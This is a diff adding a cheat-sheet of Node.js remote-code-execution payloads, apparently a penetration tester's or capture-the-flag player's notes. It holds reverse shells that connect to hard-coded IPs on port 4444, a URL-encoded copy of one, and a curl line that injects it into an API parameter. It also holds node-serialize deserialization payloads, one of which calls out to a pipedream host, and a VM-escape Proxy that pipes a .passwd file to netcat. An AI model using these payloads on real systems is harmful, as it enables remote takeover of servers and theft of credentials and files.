@@ -1,0 +1,74 @@
+### RCE node ###
+
+## code
+(function(){     
+  var net = require("net"),         
+  cp = require("child_process"),
+  sh = cp.spawn("/bin/bash", []);
+  var client = new net.Socket();
+      client.connect(4444, "10.8.98.114", function(){         
+      client.pipe(sh.stdin);         
+      sh.stdout.pipe(client);        
+      sh.stderr.pipe(client); 
+  });
+  return /a/; 
+})()
+
+# url encoded
+%28function%28%29%7B%20%20%20%20%20%0A%20var%20net%20%3D%20require%28%22net%22%29%2C%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20cp%20%3D%20require%28%22child_process%22%29%2C%0A%20%20%20%20%20%20%20sh%20%3D%20cp.spawn%28%22%2Fbin%2Fbash%22%2C%20%5B%5D%29%3B%0A%20%20var%20client%20%3D%20new%20net.Socket%28%29%3B%20%20client.connect%284444%2C%20%2210.8.98.114%22%2C%20function%28%29%7B%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20client.pipe%28sh.stdin%29%3B%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20sh.stdout.pipe%28client%29%3B%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20sh.stderr.pipe%28client%29%3B%20%0A%20%20%7D%29%3B%0A%20%20return%20%2Fa%2F%3B%20%0A%7D%29%28%29
+
+# example
+curl -X POST -vvv http://$h/api/items?cmd=%28function%28%
+
+
+## code 2
+require("child_process").exec('nc 10.8.98.114 4444 -e /bin/sh')
+require("child_process").exec('nc%20<IP Attacker>%204445%20-e%20%2Fbin%2Fsh')
+
+## code 3
+require("child_process").exec("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E9%2E98%2E114%204444%20%3E%2Ftmp%2Ff")
+
+## code 4
+hobbies=1;var salary=process.cwd();
+hobbies=1;var salary=require('child_process').execSync('ls -l').toString();
+
+
+
+###############
+## Serialize ##
+###############
+# https://book.hacktricks.xyz/pentesting-web/deserialization#node-serialize 
+
+## test
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('sleep 5');}()"}
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://eozppby15cb3qha.m.pipedream.net/');}()"}
+
+## rce
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 41.136.12.237 4444 >/tmp/f');}()"}
+
+
+
+###############
+## VM escape ##
+###############
+## https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af
+# RCE
+new Proxy({}, { get: function(me, key) {
+         const cc = arguments.callee.caller;
+         if (cc != null) { return (cc.constructor.constructor('this.process.mainModule.require("child_process").exec("cat .passwd | nc <IP> <PORT>")'))(); }
+         return me[key]; } 
+})
+
+# sensitive var
+new Proxy({},{ get: function(me, key) {return (arguments.callee.caller.constructor)('return FLAG')()}})
+
+
+
+
+
+
+
+
+
+
+
